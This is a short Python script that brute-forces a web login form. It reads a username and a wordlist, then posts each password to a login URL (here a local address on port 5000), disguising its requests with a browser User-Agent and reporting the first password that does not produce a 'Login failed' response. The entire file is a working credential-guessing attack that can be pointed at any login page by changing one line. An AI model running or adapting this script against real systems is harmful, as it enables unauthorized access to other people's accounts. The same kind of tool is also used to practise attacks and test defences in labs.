import requests
import time

url = "http://127.0.0.1:5000/login"
username = input("Enter the Username :")
wordlist = input("Path to wordlist :")
fail_msg = "Login failed"

def brute_force():
    session = requests.Session()

    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    try:
        with open(wordlist, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print("[-] Wordlist file not found")
        return

    for password in passwords:
        data = {
            "username": username,
            "password": password
        }

        try:
            response = session.post(url, data=data, headers=headers, allow_redirects=True)
        except requests.exceptions.RequestException as e:
            print("[-] Request failed:", e)
            continue

        print("[-] Trying :", password)

        if response.history or fail_msg not in response.text:
            print("[+] SUCCESS! Password found :", password)
            break

        time.sleep(1)

    else:
        print("[-] Password not found in wordlist")


if __name__ == "__main__":
    brute_force()
